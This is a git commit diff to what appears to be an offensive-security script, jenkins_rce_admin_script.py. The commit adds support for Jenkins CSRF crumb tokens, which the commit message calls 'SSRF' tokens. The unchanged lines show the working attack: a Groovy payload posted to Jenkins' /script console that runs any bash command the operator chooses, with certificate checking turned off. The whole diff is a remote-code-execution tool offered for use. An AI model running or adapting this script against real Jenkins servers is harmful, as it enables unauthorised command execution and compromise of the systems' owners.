2048cb731e9a5cf4d4f2dee385a5c9f22c2aa41f
Guillaume Quéré <1585000+gquere@users.noreply.github.com>
2022-01-03 15:48:56 +0100

    [add] Support crumbs
    Some sort of SSRF token issued by the web GUI

--- rce/jenkins_rce_admin_script.py
+++ rce/jenkins_rce_admin_script.py
@@ -17,6 +17,7 @@ parser.add_argument('-u', '--user', type=str)
 parser.add_argument('-p', '--password', type=str)
 parser.add_argument('-c', '--command', type=str, required=True)
 parser.add_argument('-C', '--cookie', type=str)
+parser.add_argument('-K', '--crumb', type=str)
 
 args = parser.parse_args()
 URL = args.url
@@ -29,6 +30,9 @@ if args.cookie:
     COOKIES = json.loads(args.cookie)
 
 DATA = {'script':"def proc = ['bash', '-c', '''{}'''].execute();def os = new StringBuffer();proc.waitForProcessOutput(os, os);println(os.toString());".format(args.command)}
+
+if args.crumb:
+    DATA.update(json.loads(args.crumb))
 
 r = requests.post(URL + '/script', data=DATA, auth=AUTH, cookies=COOKIES, verify=False)
 m = re.search('<h2>Result</h2><pre>(.*)</pre>', r.text, flags=re.DOTALL)
